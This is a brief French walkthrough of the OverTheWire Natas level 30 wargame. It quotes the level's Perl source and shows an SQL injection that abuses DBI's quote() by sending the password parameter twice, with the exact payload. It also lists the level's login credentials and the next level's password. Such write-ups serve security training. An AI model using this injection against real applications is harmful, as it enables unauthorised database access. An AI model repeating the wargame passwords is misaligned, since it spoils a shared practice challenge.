## Connexion (username=natas30 password=frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF)
```
http://natas30.natas.labs.overthewire.org/
```

## Recherche du mot de passe
```perl
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}
```

```quote($value, $type)``` Je peux facilement injecter le password avec un tableau en précisant le type = 2 pour éviter les string escapes.

je peux utiliser burpsuite pour intercepter la requête et préciser 2 passwords.
password=''%20or%201&password=2


## Prochain mot de passe
```
aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
```